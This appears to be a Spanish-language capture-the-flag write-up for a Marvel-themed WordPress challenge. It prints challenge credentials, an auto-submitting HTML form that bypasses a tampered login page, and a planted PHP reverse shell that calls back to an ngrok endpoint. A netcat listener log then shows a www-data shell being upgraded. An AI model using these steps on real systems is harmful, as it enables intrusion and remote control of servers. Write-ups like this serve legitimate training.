
Carol Danvers, la legendaria piloto y protectora intergaláctica, ha sorprendido a aliados y adversarios por igual al revelar una faceta inédita de su poder. Lejos de limitarse a combatir amenazas cósmicas, ahora se atreve a retar al sistema mediante una página web [http://20.115.58.237/](http://20.115.58.237/) secreta en la que comparte detalles de sus misiones y estrategias, desafiando a cualquiera que intente detenerla.

¿Serás capaz de infiltrarte en su red y descubrir qué información está protegiendo?

## Solucion

- La clave de acceso se consiguió del reto anterior de OSINT:  `Más allá de lo visible`

```
CarolDanvers
L#@ws!OVanBc87%hJ5
```

- El formulario de login de wordpress estaba alterado y no permitía el acceso, enviaba la solicitud usando GET y omitía el nombre de usuario
```html
<script>
    document.addEventListener("DOMContentLoaded", function() {
        alert("🚫 NUNCA PODRÁS ACCEDER 🚫");
    });
</script>

		<form nam" id="" action="" NO TIENES ACCESO  method="" >
			<p>
				<label for="usen">Usern Address</label>
				<input type="textame="log" id="ugin" class="input" value="" size="20" autocapitalize="off" autocomplete="username" required="required" />
			</p>

			<div class="user-pass-wrap">
				<label for="user_pass">Contraseña</label>
				<div class="wp-pwd">
					<input type="password" name="pwd" id="user_pass" class="input password-input" value="" size="20" autocomplete="current-password" spellcheck="false" required="required" />
					<button type="button" class="button button-secondary wp-hide-pw hide-if-no-js" data-toggle="0" aria-label="Mostrar contraseña">
						<span class="dashicons dashicons-visibility" aria-hidden="true"></span>
					</button>
				</div>
			</div>
						<p class="forgetmenot"><input name="rememberme" type="checkbox" id="rememberme" value="forever"  /> <label for="rememberme">Recuérdame</label></p>
			<p class="submit">
				<input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="Acceder" />
									<input type="hidden" name="redirect_to" value="http://20.115.58.237/" />
									<input type="hidden" name="testcookie" value="1" />
			</p>
		</form>


```

- Creamos una formulario que nos permita acceder de manera indirecta usando las credenciales que ya teniamos

```php
<html>

<head>

    <title>Crunchify Login Page</title>
    <script>
        function loginForm() {
            document.myform.submit();
            document.myform.action = "http://20.115.58.237/";
        }
    </script>
</head>

<body onload="loginForm()">
<form action="http://20.115.58.237/wp-login.php" name="myform" method="post">
    <input type="text" name="log" value="CarolDanvers">
    <input type="password" name="pwd" value="L#@ws!OVanBc87%hJ5">
    <input type="submit" value="Login">
</form>

</body>

</html>
```

## Instalar plugin WP File Manager
- Una vez dentro de Wordpress, fui al Home del sitio, elegí Plugins, busque e instale el plugin `Wp-File-Manager` y elegi `Activar`
- Una vez instalado, me permitió navegar por los archivos de la instalación de Wordpress

## Instalar el reverse shell
- Modifique un archivo llamado `index1.php` y ahí puse el reverse shell
- El reverse shell utilizado es el que viene con kali linux `/usr/share/laudanum/php/php-reverse-shell.php`

```php

$ip = '8.tcp.ngrok.io';  // CHANGE THIS
$port = 19708;       // CHANGE THIS


```


```
ngrok tcp 4444

ngrok                                                                                                                                                                                         (Ctrl+C to quit)

❤  ngrok? We're hiring https://ngrok.com/careers                                                                                                                                                                                                              
Session Status                online
Account                       Hack (Plan: Free)
Version                       3.20.0
Region                        United States (us)
Web Interface                 http://127.0.0.1:4040
Forwarding                    tcp://8.tcp.ngrok.io:19708 -> localhost:4444                                                                                                                                    
Connections                   ttl     opn     rt1     rt5     p50     p90                                                                                                                                     
                              0       0       0.00    0.00    0.00    0.00   
```

```
rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 50258
Linux UbuntuScitum 6.8.0-1021-azure #25-Ubuntu SMP Wed Jan 15 20:45:09 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 16:13:43 up 20 days,  8:40,  0 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU  WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash");'
www-data@UbuntuScitum:/$ export TERM=xterm
export TERM=xterm
www-data@UbuntuScitum:/$ stty rows 500 cols 400
stty rows 500 cols 400
www-data@UbuntuScitum:/$ cd /opt/S.H.I.E.L.D.
cd /opt/S.H.I.E.L.D.
www-data@UbuntuScitum:/opt/S.H.I.E.L.D.$ 

 


```